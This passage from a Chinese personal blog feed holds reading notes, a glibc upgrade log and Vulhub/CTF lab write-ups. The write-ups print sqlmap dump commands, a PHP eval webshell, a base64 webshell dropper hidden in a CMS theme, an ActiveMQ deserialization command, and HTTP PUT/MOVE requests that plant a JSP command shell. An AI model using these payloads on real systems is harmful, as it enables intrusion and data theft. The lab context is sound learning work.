人类清理了内心的污染，那么他们也就会停止创造其他的污染。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">依你的建议，我们应该如何摆脱这种消极的心态？</span><br></pre></td></tr></table></figure><p>就是丢掉！你是如何丢掉在手中燃烧的煤炭的？你是如何丢掉身上沉重而无用的包袱的？如果你认识到你不想再遭受痛苦的折磨或背负沉重的负担，这时你就可以放下它们了。</p><p>深层的无意识状态（如痛苦之身）或其他深度的痛苦（如丧失所爱之人），通常只有当你接纳并保持持续关注，即保持你的临在意识之光时，才能得到改变。另一方面，一旦你意识到你不再需要这些无意识模式，意识到你还可以有其他选择，而不一定要受制于一些条件反射，你就可以轻松摆脱这种无意识了。所有这些意味着你有能力获取当下的力量。离开它，你就没有选择了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果你称一些情绪为消极的，如你先前所解释的，你不是创造了一个判断好与坏的二元对立吗？</span><br></pre></td></tr></table></figure><p>不。当你的思维将当下时刻判定为坏的时候，这个极性就已经被创造了；然后这种判断就引发了消极的情绪。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">但是如果你说有些情绪是消极的，那么你的意思是说它们不应该存在，我们不应该有这些情绪吗？我对此的理解是我们应该允许自己拥有任何情绪，而不是判断它们的好与坏，或者我们不应该拥有它们。我们感到怨恨、愤怒、郁闷等都是可以的——否则我们将会陷入压抑状态，我们的内心就会有冲突或是否定。任何事情都应该顺其自然。</span><br></pre></td></tr></table></figure><p>当然是这样的。一旦一个思维模式、一个情绪或者反应存在时，我们就应该接受它。你那时没有足够的意识来做出选择。这不是一个判断，只是一个事实。如果你只有一个选择，或者认识到你的确可以有一个选择，你会选择痛苦还是欢乐，安逸还是不安，和平还是冲突？你会选择一种使你脱离自然的幸福状态、脱离生命内在欢乐的思想或情绪吗？任何这样的情绪，我们都称之为消极的情绪，简单地说就是不好的情绪。这并不是说“你不该这么做”的那种不好，而只是客观评述，就像说胃痛一样。</p><p>仅在20世纪就有一亿多的人死于其他同胞之手，这怎么可能呢？人类彼此造成的这种痛苦是超乎你的想象的。这还不包括每天人类彼此间或对其他生物造成的精神、情绪、身体上的暴力、折磨等痛苦。</p><p>他们以这种方式行动是因为他们进入了自己的自然状态，并感受到了生命内在的喜悦吗？当然没有。只有那些处于深深的消极状态之中、感觉很坏的人才会做出这种事情，这反映了他们内在的状态。现在他们又在开始破坏大自然以及他们赖以生存的地球。这简直令人无法相信，但这却又是一个事实。人类是一个精神失常并且非常病态的物种。这不是批判，而是事实。还有这样的一个事实：人类在疯狂之下是有理智的，而现在你就可以找到一些治疗和拯救方法。</p><p>现在回到你刚才所说的——当你接受了你的怨恨、压抑和愤怒时，你不再被迫盲目地将它们付诸行动，而你也不太会将它们投射在其他人身上。这的确是真的，但是我不知道你是不是在欺骗你自己。因为当你练习接纳一段时间之后，你需要再继续向下一个阶段迈进，那个不再创造这些消极情绪的阶段。如果你不再继续向前迈进，你的这种接纳就成了一个精神上的标记，它使你的小我不断地沉浸在不幸之中，而且还会加强你和其他人的分离感。如你所知，分离是小我认同感的基础。真正的接纳会立即转化这些情感。如果你真的认为每件事都很好，这当然是真的，但是你在一开始就会有这些消极的情感吗？不批判和抗拒的话，这些消极的情感就不会产生。在你的大脑中，你有了想法，认为每件事都很好，但是，在你的内心深处你又不能真正地相信它，所以那种陈旧的、抗拒的思维——情绪模式仍然存在。这就是让你感觉不好的原因。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">那也没什么不好。</span><br></pre></td></tr></table></figure><p>你在维护你无意识和遭受痛苦的权利吗？别着急：没有人会把它们从你的身边夺走。一旦你认识到某种食物让你恶心，你还会继续吃这种食物，并还声称恶心的感觉很好吗？</p><h2 id="第五章-临在状态"><a href="#第五章-临在状态" class="headerlink" title="第五章 临在状态"></a>第五章 临在状态</h2><h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>​ 实在是…过于震撼的一本好书 很好的教会了我如何去正视并消除自己的杂乱思想 虽然难以真正达到书中描写的“开悟” 但的确有了不少隐约的自信与安稳<br>​ 遭受苦难并不少见 将其快速瓦解 化为一种行事的能量 然后采取行动</p><p>​</p><h1 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾&#x2F;引用"></a>结尾&#x2F;引用</h1><blockquote><p>We are just another visitor in a transient world.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网页小修时间</title>
      <link href="/2024/11/23/%E7%BD%91%E9%A1%B5%E5%B0%8F%E4%BF%AE%E6%97%B6%E9%97%B4/"/>
      <url>/2024/11/23/%E7%BD%91%E9%A1%B5%E5%B0%8F%E4%BF%AE%E6%97%B6%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="这篇文章单纯是为了推进-督促我搞这个博客的进度的"><a href="#这篇文章单纯是为了推进-督促我搞这个博客的进度的" class="headerlink" title="这篇文章单纯是为了推进&#x2F;督促我搞这个博客的进度的"></a>这篇文章单纯是为了推进&#x2F;督促我搞这个博客的进度的</h2><p>已经干的</p><ul><li>404自定义页面</li></ul><p>要干的</p><ul><li>新页面的功能构思&#x2F;页面设计</li><li>jsplayer&#x2F;或者别的什么 播放音乐</li><li>搜索引擎支持&#x2F;rss逻辑更新</li><li>自我介绍update</li><li>不必多说的写更多文章</li></ul><p>反正有空了都能来搞 先推上日程</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc更新记录</title>
      <link href="/2024/11/12/glibc%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/11/12/glibc%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>最近因为各种各样的原因操弄上了校园官方渠道的服务器 分到了配置linux系统的工作<br>为了完成我的任务 我需要安装更新版本的glibc<br>期间发生了大大小小的问题还把服务器搞炸了 总之记录一下防止后边踩坑吧<br>以后再有linux系统选择相关的 铁定首选ubuntu 我心累了</p><h2 id="万恶之源"><a href="#万恶之源" class="headerlink" title="万恶之源"></a>万恶之源</h2><p>服务器系统的选择上来说——环境是一个基本光秃秃啥都没装的CentOS Linux release 7.9.2009 (Core)<br>yum确实可以事先安装大部分玩意 但 GLIBC 库是系统的基础组件 我无法于当前的系统版本直接通过yum更新glibc<br>既然apt(Ubuntu才有的安装方式) yum rpm都不行 就只能尝试最拖最难搞的源码安装了</p><h2 id="好比套娃的安装方式"><a href="#好比套娃的安装方式" class="headerlink" title="好比套娃的安装方式"></a>好比套娃的安装方式</h2><p>在网上找了一会 看到了个相对来说靠谱 版本对劲的安装指南<br>依据<a href="https://blog.csdn.net/carefree2005/article/details/117559312">该教程</a>的说法</p><h3 id="至于安装glibc的2-31版本有以下的要求-麻烦"><a href="#至于安装glibc的2-31版本有以下的要求-麻烦" class="headerlink" title="至于安装glibc的2.31版本有以下的要求&amp;麻烦"></a>至于安装glibc的2.31版本有以下的要求&amp;麻烦</h3><ol><li>安装glibc时中断&#x2F;配置不全或者因为各种各样的原因都极易导致服务器崩溃</li><li>glibc所需要的组件多且版本要求高 基本也同样是没法用yum一站式解决的 需要源码安装</li><li>具体需求（可能不对 可以去实际操作的时候查看目录下的install文件）<br>需要python版本2.7.6以上 3.4以上（python2 3同时需要）<br>gcc版本4.7以上<br>make版本3.79以上<br>bison（有个叫m4的依赖）版本2.7以上</li><li>源码安装运行.&#x2F;configure时 务必谨慎配置–prefix项（决定安装目录） 并且搞懂每个版本的相同软件在系统中的位置</li><li>yum依靠python运行 若更新python时覆盖了原版本 会十分麻烦 重装相同版本也难以恢复 需要通过卸载所有python 以rpm覆盖的方式恢复yum的使用 还有yum的指定python运行路径由文件 &#x2F;usr&#x2F;libexec&#x2F;urlgrabber-ext-down 与 &#x2F;usr&#x2F;bin&#x2F;yum 决定<br><img src="1.jpg" alt="1"><br>如果yum出现了各种各样的问题 记得先检查这两个文件的第一行</li><li>源码安装时有些软件会强制你在文件夹下新建build文件夹再执行configure 这里建议先手创建好文件夹再..&#x2F;configure 先下手为强</li><li>源码安装gcc非常非常慢 建议做好等待半小时-一小时（基于你make时候指定的-j参数 后面会说）的准备</li><li>更新glibc似乎会导致不少命令暂时失效 如果你是通过ssh等命令连接的服务器 务必不要退出 不然会导致服务器爆炸可以<a href="https://blog.csdn.net/qq_35345103/article/details/99679506">参考这玩意里的代码</a>试图恢复</li><li>如果还是一不小心给yum python整炸了 <a href="https://www.cnblogs.com/gcgc/p/15922141.html">参考教程</a>可以做到恢复功能 记得注意版本区别</li></ol><h2 id="具体的安装过程"><a href="#具体的安装过程" class="headerlink" title="具体的安装过程"></a>具体的安装过程</h2><p>因为早就过去了所以复现图片啥的就不贴咯<br>先用yum安装一些没必要源码安装的东西<br>yum update -y<br>yum install bison make wget unzip等等</p><p>至于又臭又长的源码安装全过程</p><ol><li>用wget下载软件的源tar包</li><li>解压后阅读install文件&#x2F;去网络搜索所需依赖</li><li>创建build文件夹后在其中运行configure文件 成功的话会提示创建了makefile 报错了就要去检查哪里有问题</li><li>make后输入make install安装似乎就完成了 记得检查安装目录是否安装成功</li></ol><p>gcc python2 3 glibc都需要用如上的方式来安装 期间会遇到各种各样的问题 因为每个软件的源码安装会有不同的需求</p><h2 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾&#x2F;引用"></a>结尾&#x2F;引用</h2><hr><p>奠 某个服务器的第一条命（虽然挺快就重置了） 奠<br>死因:glibc没配置好导致错误的软连接 输入什么都回显Segmentation fault 变相的系统崩溃</p><blockquote><p>We are just another visitor in a transient world.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulhub在线靶场记录</title>
      <link href="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="开幕介绍-具体简介"><a href="#开幕介绍-具体简介" class="headerlink" title="开幕介绍&amp;具体简介"></a>开幕介绍&amp;具体简介</h1><p>具体环境为<a href="https://yunjing.ichunqiu.com/">这个网站</a><br>能在线部署不少漏洞环境 很方便 正巧拿去了解一下vulhub与src</p><p>不会把打过的全部记录 主要是因为有的靶场重复度略高 分分钟就刷完了 <del>说到底还是条懒狗</del><br>tips:靶场环境很怪 有的时候不开代理加载不全</p><h1 id="常见套路"><a href="#常见套路" class="headerlink" title="常见套路"></a>常见套路</h1><p>密码账号通常藏在网页信息中&#x2F;单纯就是初始密码<br>使用将burp中的raw报文保存为txt后 <code>mysql -r 文件名 -batch --dbs</code>进行暴库的方式进行sql注入<br><strong>↑多见于post传参时使用</strong><br>只要文件类型允许php便能通过链接后端webshell的方式进行文件上传漏洞验证</p><h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a><strong>CVE-2022-32991</strong></h2><blockquote><p><em>靶标介绍：</em></p><p>该CMS的welcome.php中存在SQL注入攻击。</p></blockquote><p>靶标写的很清楚了 就是sql注入攻击<br>随意注册一个账号 登陆后便看到了我们的目标——welcome.php<br><img src="1.jpg" alt="1"><br>拖到sqlmap里说是参数q并不能注入 点击start跳转目录 能看到更多的传参<br>再次放到sqlmap里处理….. 显示eid可注入 挺好的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-u &quot;想注入的网址&quot; //目标地址</span><br><span class="line">--dbs //爆出所有数据库</span><br><span class="line">-D //选中数据库 配合 --tables //爆出所有数据库下的项</span><br><span class="line">-T //选中项 配合 --dump //爆出项中的数据</span><br></pre></td></tr></table></figure><p>配合网址就能爆出数据库ctf中flag项里的具体数据——flag值 过关</p><h2 id="CVE-2022-30887"><a href="#CVE-2022-30887" class="headerlink" title="CVE-2022-30887"></a><strong>CVE-2022-30887</strong></h2><blockquote><p><em>靶标介绍：</em></p><p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的, 该软件的主要目的是在药房和客户之间提供一套接口，客户是该软件的主要用户。该软件有助于为药房业务创建一个综合数据库，并根据到期、产品等各种参数提供各种报告。 该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞，进而导致任意代码执行。</p></blockquote><p>一进主页面是全白的<br>铁定不对 先用dirb扫了一遍<br><img src="2.jpg" alt="2"><br>发现个login目录 进去跳转到了wordpress的登陆页面<br>至于登陆的账号密码已经在标题上写好了——test<br><img src="3.jpg" alt="3"><br>登陆进去看看<br>在wp-admin处 我们利用<a href="https://wpscan.com/vulnerability/a0e40cfd-b217-481c-8fc4-027a0a023312/">一个漏洞</a>来获取mysql 数据库中的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze816q8joahfm3hcxoi.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php?action=rest-nonce //获取一段随机数</span><br><span class="line">http://eci-2ze6ki5jtumuv5ixl9hu.cloudeci1.ichunqiu.com/wp-json/wp-statistics/v2/metabox?\_wpnonce=[刚刚获取的随机数]&amp;name=words&amp;search\_engine=aaa</span><br></pre></td></tr></table></figure><p>将输入后的内容用burpsuite抓包<br><img src="4.jpg" alt="4"><br>然后将报文保存在一个1.txt中 然后利用sqlmap进行暴库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --batch --dbs</span><br></pre></td></tr></table></figure><p><img src="5.jpg" alt="5"></p><p>然后就很自然的爆出了flag 耶</p><h2 id="CVE-2022-28525"><a href="#CVE-2022-28525" class="headerlink" title="CVE-2022-28525"></a>CVE-2022-28525</h2><blockquote><p><em>靶标介绍：</em></p><p>ED01-CMS v20180505 存在任意文件上传漏洞</p></blockquote><p>进入页面 发现需要登陆 且无法正常注册用户</p><p><img src="6.jpg" alt="6"></p><p>那就f12看看线索吧…<br>发现似乎存在admin账号 那就先admin&#x2F;admin试试 再不行抓包爆破了</p><p><img src="7.jpg" alt="7"></p><p>然后顺利进去了 傻眼<br>管理员页面全是文章添加&#x2F;删改相关的 能上传东西的只有一个账号头像了<br>上传后门文件1.php 内容还是老样子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($\_POST[&#x27;123&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="8.jpg" alt="8"></p><p>右键图片处copy文件网址 放进蚁剑里链接 在&#x2F;flag处获得flag 完成！</p><p><img src="9.jpg" alt="9"></p><h2 id="CVE-2023-7105"><a href="#CVE-2023-7105" class="headerlink" title="CVE-2023-7105"></a>CVE-2023-7105</h2><blockquote><p><em>靶标介绍：</em></p><p>E-Commerce Website 1.0 允许通过“index_search.php”中的参数“search”进行 SQL 注入。利用这个问题可能会使攻击者有机会破坏应用程序，访问或修改数据，或者利用底层数据库中的最新漏洞。</p></blockquote><p>进入主页 翻到个搜索框 看来就是对应了靶标中的<code>index_search</code>功能<br>burp开着监听 随便搜点东西 监听到了搞成txt放进sqlmap<br><img src="10.jpg" alt="10"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r [报文txt] --dbs //爆出数据库</span><br><span class="line">sqlmap -r [报文txt] -D [数据库名] --tables //选中数据库爆出数据项</span><br><span class="line">sqlmap -r [报文txt] -D [数据库名] -T [数据项名] --dump //爆出数据项中的数据</span><br></pre></td></tr></table></figure><p><img src="11.jpg" alt="11"></p><p>弄到最后一步就有flag了</p><h2 id="CVE-2022-26965"><a href="#CVE-2022-26965" class="headerlink" title="CVE-2022-26965"></a>CVE-2022-26965</h2><blockquote><p><em>靶标介绍：</em></p><p>Pluck-CMS-Pluck-4.7.16 后台RCE</p></blockquote><p>进入页面啥也没有 点击脚注admin<br>输入密码admin进入后台<br><img src="12.jpg" alt="12"></p><p>rce的具体地点发生在网站后台的<strong>更换主题</strong>中<br><img src="13.jpg" alt="13"></p><p>去github上搜索关键词 <code>Pluck CMS</code> 去寻找简介里有 <strong>theme</strong> 字眼的项目<br><img src="14.jpg" alt="14"></p><p>进去之后在release页面下载 解压内容之后更改<code>info.php</code>文件内的具体代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">file\_put\_contents(&#x27;testshell.php&#x27;,base64\_decode(&#x27;PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg==&#x27;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>修改完再次打包成zip 安装主题里弄上<br>安装完之后访问环境<code>/testshell.php?1= cat /flag</code>获取flag<br>完成！</p><h2 id="CVE-2023-37474"><a href="#CVE-2023-37474" class="headerlink" title="CVE-2023-37474"></a>CVE-2023-37474</h2><blockquote><p><em>靶标介绍：</em></p><p>Copyparty是一个可移植的文件服务器。在1.8.2版本之前的版本存在一个CTF技巧，该漏洞位于<code>.cpr</code>子文件夹中。路径遍历攻击技术允许攻击者访问位于Web文档根目录之外的文件、目录.</p></blockquote><p>子目录也说了是.cpr 在网址后边输入&#x2F;.cpr&#x2F;（想要获取的文件名）<br>&#x2F;符号用%2f代替即可 输入后便会自动下载相应的文件</p><h1 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾&#x2F;引用"></a>结尾&#x2F;引用</h1><blockquote><p>We are just another visitor in a transient world.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> src </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> src </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulhub记录（旧的）</title>
      <link href="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="一脚踹开src的大门"><a href="#一脚踹开src的大门" class="headerlink" title="一脚踹开src的大门"></a>一脚踹开src的大门</h2><p>嘛 机缘巧合下开始练习src 总之先拿vulhub练练手<br>注释: 本来用的是docker纯本地搭建 效率太鸡肋了 换成在线网站搞flag的形式吧 没法getshell的会在这里继续更新</p><p>漏洞很多 试点经典的 基本按着readme做</p><h1 id="总结遇到的问题"><a href="#总结遇到的问题" class="headerlink" title="总结遇到的问题"></a>总结遇到的问题</h1><p>-我使用的环境是 <strong>docker for windows</strong> 因此会出现各种奇葩的问题 这里记录</p><h2 id="换行符问题"><a href="#换行符问题" class="headerlink" title="换行符问题"></a>换行符问题</h2><p>关键词:(出现在常常闪退的容器环境的log中)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;\r&#x27;: command not found</span><br><span class="line">syntax error: unexpected end of file</span><br><span class="line">exec /docker-entrypoint.sh: no such file or directory （CVE-2019-14234）</span><br></pre></td></tr></table></figure><p>vulhub下自带文件有些只考虑了linux的换行符&#x2F;文件格式 下载到windows会被自动转换<br>我使用了Git Bash 自带的工具 <code>dos2unix</code>转换文件至unix格式 至此就能正常运行了</p><h1 id="ActiveMQ-反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ-反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ 反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ 反序列化漏洞（CVE-2015-5254）</h1><p>至于创建环境和搭建环境 请自行练习docker的操作</p><blockquote><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。<br>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p></blockquote><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><blockquote><p>漏洞利用过程如下：</p><ol><li>构造（可以使用ysoserial）可执行命令的序列化对象</li><li>作为一个消息，发送给目标61616端口</li><li>访问web管理页面，读取消息，触发漏洞<br>使用<a href="https://github.com/matthiaskaiser/jmet">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。<br>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</li><li>执行：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></figure></blockquote><p>在复现的时候遇到了问题 kali自带的java版本太高导致了报错 这里临时下个java8替换掉原版<br><a href="https://blog.csdn.net/weixin_44862511/article/details/132415494">我参考的教程</a><br><img src="1.jpg" alt="1"><br>提示这样就完事了</p><blockquote><p>此时会给目标ActiveMQ添加一个名为event的队列，我们可以通过<code>http://your-ip:8161/admin/browse.jsp?JMSDestination=event</code>看到这个队列中所有消息：</p></blockquote><p>使用默认账号密码admin admin登录进去<br><img src="2.jpg" alt="2"></p><blockquote><p>点击查看这条消息即可触发命令执行，此时进入容器<code>docker compose exec activemq bash</code>，可见&#x2F;tmp&#x2F;success已成功创建，说明漏洞利用成功：</p></blockquote><p><img src="3.jpg" alt="3"></p><blockquote><p>将命令替换成弹shell语句再利用：(我用的是windows环境下的docker就不试这个了)<br>值得注意的是，通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。</p></blockquote><h1 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h1><blockquote><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。<br>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：<br>1.其使用率并不高<br>2.文件操作容易出现漏洞<br>所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf&#x2F;jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。<br>在测试过程中，可以关注ActiveMQ的版本，避免走弯路。</p></blockquote><blockquote><p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。<br>文件写入有几种利用方法：<br>1.写入webshell<br>2.写入cron或ssh key等文件<br>3.写入jar或jetty.xml等库和配置文件<br>写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋；写入cron或ssh key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径。<br>分别说一下上述几种利用方法。</p></blockquote><h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><blockquote><p>前面说了，写入webshell，需要写在admin或api应用中，而这俩应用都需要登录才能访问。</p><p>默认的ActiveMQ账号密码均为<code>admin</code>，首先访问<code>http://your-ip:8161/admin/test/systemProperties.jsp</code>，查看ActiveMQ的绝对路径：</p></blockquote><p><img src="4.jpg" alt="4"></p><p>然后上传webshell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/2.txt HTTP/1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 120976</span><br><span class="line">&lt;%@ page import=&quot;java.io.\*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">out.print(&quot;Hello&lt;/br&gt;&quot;);</span><br><span class="line">String strcmd=request.getParameter(&quot;cmd&quot;);</span><br><span class="line">String line=null;</span><br><span class="line">Process p=Runtime.getRuntime().exec(strcmd);</span><br><span class="line">BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line">while((line=br.readLine())!=null)&#123;</span><br><span class="line">out.print(line+&quot;&lt;/br&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="5.jpg" alt="5"></p><p>通过burpsuite的MOVE操作有点略难 这里试了几次有时会报400<br><img src="6.jpg" alt="6"></p><p>移动到web目录下的api文件夹（<code>/opt/activemq/webapps/api/s.jsp</code>）中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/2.txt HTTP/1.1</span><br><span class="line">Destination: file:///opt/activemq/webapps/api/s.jsp</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>访问webshell（需要登录）：<br><img src="7.jpg" alt="7"></p><h1 id="Apache-ActiveMQ-Jolokia-后台远程代码执行漏洞（CVE-2022-41678）"><a href="#Apache-ActiveMQ-Jolokia-后台远程代码执行漏洞（CVE-2022-41678）" class="headerlink" title="Apache ActiveMQ Jolokia 后台远程代码执行漏洞（CVE-2022-41678）"></a>Apache ActiveMQ Jolokia 后台远程代码执行漏洞（CVE-2022-41678）</h1><blockquote><p>Apache ActiveMQ 是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。</p><p>Apache ActiveMQ 在5.16.5, 5.17.3版本及以前，后台Jolokia存在一处任意文件写入导致的远程代码执行漏洞。</p><p>参考链接：</p><ul><li><a href="https://activemq.apache.org/security-advisories.data/CVE-2022-41678-announcement.txt">https://activemq.apache.org/security-advisories.data/CVE-2022-41678-announcement.txt</a></li><li><a href="https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/">https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/</a></li></ul></blockquote><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先，访问<code>/api/jolokia/list</code>这个API可以查看当前服务器里所有的MBeans： cv</p></blockquote><p><img src="10.jpg" alt="10"></p><blockquote><p>是使用<code>org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean</code>，这是由Log4j2提供的一个MBean。<br>攻击者使用这个MBean中的<code>setConfigText</code>操作可以更改Log4j的配置，进而将日志文件写入任意目录中。<br>使用<a 